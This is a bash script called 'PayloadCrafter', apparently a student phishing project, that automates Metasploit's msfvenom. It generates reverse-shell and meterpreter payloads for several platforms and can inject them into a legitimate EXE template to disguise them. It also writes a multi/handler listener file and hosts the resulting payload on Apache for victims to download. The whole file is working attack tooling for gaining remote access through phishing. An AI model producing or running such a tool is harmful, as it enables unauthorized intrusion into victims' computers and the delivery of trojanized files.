#!/bin/bash

# PayloadCrafter | PROJECT: PHISHING
# Student Name: MR-Suda
# Program Code: 
# Class Code: 
# Lecturer: Shiffman David

RED='\e[1;31m'
CYAN='\e[1;36m'
YELLOW='\e[1;33m'
GREEN='\e[1;32m'
NC='\e[0m'

function root_priv() {
	sudo
	if [ "$EUID" -ne 0 ]; then
		echo -e "[!] This script must be run with root privileges."
		exit 1
	fi
	banner
}

function safe_exit() {
	
	echo
	echo -e "\n${RED}[!]${NC} Script interrupted or crashed. Cleaning up..."
	rm -f "$info_file" "$option_list_file" temp_advanced_block.txt msfvenom_output.txt listener_*.rc 2>/dev/null
	tput sgr0
	stty sane
	sudo systemctl stop apache2 2>/dev/null
	exit 1	
}

trap safe_exit INT TERM ERR

function banner() {
	
	clear
	echo -e "\n${RED}           ╔═════════════════════════════╗"
	echo -e "           ║     ${YELLOW}PayloadCrafter v1.0${RED}     ║"
	echo -e "           ║ ${CYAN} RTX Cyber Warfare Module ${RED}  ║"
	echo -e "           ║  ${CYAN}Automated Payload Builder${RED}  ║"
	echo -e "           ║       💀 By MR-Suda 💀      ║"
	echo -e "           ╚═════════════════════════════╝${NC}"
}

function main_menu() {
	
	while true; do
		clear
		banner
		echo -e "\n${CYAN}Select a payload to generate:${NC}"
		echo -e "\n${YELLOW} 1)${NC} windows/meterpreter/reverse_tcp        (Staged)"
		echo -e "${YELLOW} 2)${NC} windows/meterpreter/reverse_http       (Staged)"
		echo -e "${YELLOW} 3)${NC} linux/x86/meterpreter/reverse_tcp      (Staged)"
		echo -e "${YELLOW} 4)${NC} android/meterpreter/reverse_tcp        (Staged)"
		echo -e "${YELLOW} 5)${NC} windows/x64/meterpreter/reverse_https  (Staged)"
		echo -e "\n${GREEN}-----------------------------------------------------${NC}"
		echo -e "\n${YELLOW} 6)${NC} windows/meterpreter_reverse_tcp        (Stageless)"
		echo -e "${YELLOW} 7)${NC} windows/x64/shell_reverse_tcp          (Stageless)"
		echo -e "${YELLOW} 8)${NC} linux/x64/shell_reverse_tcp            (Stageless)"
		echo -e "${YELLOW} 9)${NC} osx/x64/shell_reverse_tcp              (Stageless)"
		echo -e "${YELLOW}10)${NC} Enter custom payload manually          (Staged/less)"
		echo -e "${YELLOW}11)${NC} ${RED}Exit${NC}"
		echo
		read -p "Enter your choice (1-11): " choice
		case $choice in
			1) PAYLOAD="windows/meterpreter/reverse_tcp"; break ;;
			2) PAYLOAD="windows/meterpreter/reverse_http"; break ;;
			3) PAYLOAD="linux/x86/meterpreter/reverse_tcp"; break ;;
			4) PAYLOAD="android/meterpreter/reverse_tcp"; break ;;
			5) PAYLOAD="windows/x64/meterpreter/reverse_https"; break ;;
			6) PAYLOAD="windows/meterpreter_reverse_tcp"; break ;;
			7) PAYLOAD="windows/x64/shell_reverse_tcp"; break ;;
			8) PAYLOAD="linux/x64/shell_reverse_tcp"; break ;;
			9) PAYLOAD="osx/x64/shell_reverse_tcp"; break ;;
			10) payload_check && break ;;
			11) exit 0 ;;
		esac
	done

	echo -e "\n${GREEN}[+] Selected payload:${NC} $PAYLOAD"
	payload_setup
}

function payload_check() {
	
	while true; do
		echo -e "\n${CYAN}[*]${NC} Enter the full ${CYAN}payload name${NC} Or type ${YELLOW}back${NC} to return to the main menu."
		echo
		read -p "Payload: " input

		if [[ "$input" == "back" ]]; then
			clear
			banner
			return
		fi

		if msfvenom -l payloads | awk '{print $1}' | grep -xq "$input"; then
			PAYLOAD="$input"
			break
		else
			echo -e "\n${RED}[!]${NC} Invalid payload. Please try again or type 'back'."
		fi
	done
}

function payload_setup() {
	
	while true; do
		DEFAULT_IP=$(ip route get 1 | awk '{print $7; exit}')
		echo
		read -p "Enter LHOST (leave blank for: $DEFAULT_IP): " LHOST
		LHOST=${LHOST:-$DEFAULT_IP}

		if [[ "$LHOST" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
			# Check each octet is <= 255
			valid=true
			IFS='.' read -r o1 o2 o3 o4 <<< "$LHOST"
			for octet in $o1 $o2 $o3 $o4; do
				if (( octet < 0 || octet > 255 )); then
					valid=false
					break
				fi
			done
				if [[ "$valid" == true ]]; then
					break
				fi
		fi
		echo -e "\n${RED}[!]${NC} Invalid IP. Please try again."
	done

	while true; do
		echo
		read -p "Enter LPORT (leave blank for: 4444): " LPORT
		LPORT=${LPORT:-4444}

		if [[ "$LPORT" =~ ^[0-9]+$ ]] && (( LPORT > 0 && LPORT <= 65535 )); then
			break
		fi
		echo -e "\n${RED}[!]${NC} Invalid port. Please enter a number between 1 and 65535."
	done

	VALID_FORMATS=("exe" "dll" "raw" "asp" "aspx" "elf" "macho" "psh" "c" "rb" "war")
	while true; do
		echo
		read -p "Enter output format (exe, dll, raw, etc.. or leave blank for: exe): " FORMAT
		FORMAT=${FORMAT:-exe}

		for f in "${VALID_FORMATS[@]}"; do
			if [[ "$FORMAT" == "$f" ]]; then
				format_ok=true
				break
			fi
		done

		if [[ "$format_ok" == true ]]; then
			break
		fi
		echo -e "\n${RED}[!]${NC} Invalid format. Allowed: ${VALID_FORMATS[*]}"
		format_ok=false
	done
	
	echo
	read -p "Inject into existing EXE using -x and -k? [y\n]: " USE_TEMPLATE
	USE_TEMPLATE=${USE_TEMPLATE:-n}

	if [[ "$USE_TEMPLATE" =~ ^[yY]$ ]]; then
		while true; do
			echo
			read -p "Enter path to template EXE file (or type 'back' to skip): " TEMPLATE_PATH
			
			if [[ "$TEMPLATE_PATH" == "back" ]]; then
				echo -e "${YELLOW}[!] Skipping injection as requested.${NC}"
				TEMPLATE_FLAG=""
				break
			elif [[ ! -f "$TEMPLATE_PATH" ]]; then
				echo -e "${RED}[!] File not found. Please try again.${NC}"
			elif [[ "$TEMPLATE_PATH" != *.exe ]]; then
				echo -e "${RED}[!] File is not a .exe. Please provide a valid .exe file.${NC}"
			else
				TEMPLATE_FLAG="-x $TEMPLATE_PATH -k"
				break
			fi
		done
	else
		TEMPLATE_FLAG=""
	fi

	clear
	banner
	echo
	echo -e "${GREEN}[+] Payload:${NC} $PAYLOAD options set:"
	echo -e "\n${YELLOW}    LHOST: $LHOST"
	echo -e "    LPORT: $LPORT"
	echo -e "    FORMAT: $FORMAT"
	[[ -n "$TEMPLATE_FLAG" ]] && echo -e "    Template EXE: $TEMPLATE_PATH (-x enabled)"
	echo -e "${NC}"

	check_payload_type
}

function check_payload_type() {

	if [[ "$PAYLOAD" == *"/"* ]]; then
		local last_part="${PAYLOAD##*/}"

		if [[ "$last_part" == *_* ]]; then
			echo -e "${GREEN}[+]${NC} You chose a ${GREEN}stageless${NC} payload."
		else
			echo -e "${GREEN}[+]${NC} You chose a ${GREEN}staged${NC} payload."
		fi
	else
		echo -e "${RED}[!] Invalid payload format:${RED} $PAYLOAD"
	fi
	advanced_options
}

function advanced_options() {
	
	info_file="payload_info.txt"
	option_list_file="advanced_option_names.txt"
	advanced_args=""
	msfvenom -p "$PAYLOAD" --list-options > "$info_file" 2>/dev/null

	awk '{ if ($0 ~ /----/ && ++count == 2) start = 1; else if (start && NF) print; else if (start && $0 == "") exit }' "$info_file" > temp_advanced_block.txt
	awk '{print $1}' temp_advanced_block.txt > "$option_list_file"
	mapfile -t options < "$option_list_file"

	echo -e "\n${YELLOW}Available Advanced Options:${NC}"
	for i in "${!options[@]}"; do
		printf "${CYAN}%2d)${NC} %s\n" "$((i+1))" "${options[$i]}"
	done

	while true; do
		echo -e "\nEnter the number of the option you want to set ${GREEN}(press ENTER to continue).${NC}"
		read -p "Selection: " selection

		[[ -z "$selection" ]] && break
		
		index=$((selection-1))
		if [[ $index -ge 0 && $index -lt ${#options[@]} ]]; then
			opt_name="${options[$index]}"
			setting=$(awk -v name="$opt_name" '$1 == name {print $2}' temp_advanced_block.txt)
			required=$(awk -v name="$opt_name" '$1 == name {print $3}' temp_advanced_block.txt)
			desc=$(awk -v name="$opt_name" '$1 == name { $1=$2=$3=""; sub(/^ +/, ""); print }' temp_advanced_block.txt)
			echo -e "${YELLOW}Current Setting:${NC} $setting"
			echo -e "${YELLOW}Required:${NC} $required"
			echo -e "${YELLOW}Description:${NC} $desc"
			read -p "Set value for $opt_name (leave blank to skip): " value
			[[ -n "$value" ]] && advanced_args+="$opt_name=$value "
		else
			echo -e "${RED}[!] Invalid selection: $selection${NC}"
		fi
	done
	
	clear
	banner
	
	if [[ -n "$advanced_args" ]]; then
		echo -e "\n${GREEN}[+]${NC} Advanced options set:"
		echo -e "\n$advanced_args"
	else
		echo -e "\n${YELLOW}[!]${NC} No advanced options set."
	fi

	ADVANCED_ARGS="$advanced_args"

	rm -f "$info_file" "$option_list_file" temp_advanced_block.txt
	generate_payload
}

function generate_payload() {
    default_name="payload_${RANDOM}.${FORMAT}"
    echo
    read -p "Enter name for output file (default: $default_name): " output_name
    output_name=${output_name:-$default_name}
    CMD="msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT $ADVANCED_ARGS -f $FORMAT $TEMPLATE_FLAG -o $output_name"

    echo -e "\n${CYAN}[*]${NC} Generating payload with msfvenom..."
    echo -e "\n${GREEN}[+] Running:${NC} $CMD"
    echo -e "\n[+] Running: $CMD\n" > msfvenom_output.txt

    msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" $ADVANCED_ARGS -f "$FORMAT" $TEMPLATE_FLAG -o "$output_name" \
        2>&1 | tee -a msfvenom_output.txt

    if ! grep -q "Payload size:" msfvenom_output.txt; then
        echo -e "\n${RED}[!]${NC} msfvenom failed to generate the payload. See msfvenom_output.txt for details."
        rm -f "$output_name"
        safe_exit
    fi

    listener_file="listener_$RANDOM.rc"
    echo "use exploit/multi/handler" > "$listener_file"
    echo "set PAYLOAD $PAYLOAD" >> "$listener_file"
    echo "set LHOST $LHOST" >> "$listener_file"
    echo "set LPORT $LPORT" >> "$listener_file"
    echo "set ExitOnSession false" >> "$listener_file"
    echo "exploit -j" >> "$listener_file"

    echo -e "\n${GREEN}[+]${NC} MSFVenom Command & Output saved to msfvenom_output.txt"
    echo -e "${GREEN}[+]${NC} Listener file created: $listener_file"
    echo -e "${YELLOW}[>]${NC} You can launch the listener using:"
    echo -e "    ${GREEN}msfconsole -r $listener_file${NC}"

    apache_hosting
}

function apache_hosting() {
	echo
	read -p "Do you want to host the payload on Apache web server? (y/n): " host_choice
	host_choice=${host_choice,,}
	if [[ "$host_choice" != "y" ]]; then
		
		return
	fi

	echo -e "${CYAN}[*]${NC} Checking Apache2 service status..."
	if ! systemctl is-active --quiet apache2; then
		echo -e "${YELLOW}[!]${NC} Apache2 is not running. Starting it now..."
		sudo systemctl start apache2

		if ! systemctl is-active --quiet apache2; then
			echo -e "${RED}[!]${NC} Failed to start Apache2. Hosting aborted."
			return
		fi
	fi

	sudo cp "$output_name" /var/www/html/
	echo -e "${GREEN}[+]${NC} Payload copied to /var/www/html/$output_name"
	echo -e "${YELLOW}[>]${NC} Access it via: http://${LHOST}/${output_name}"
}

root_priv
main_menu
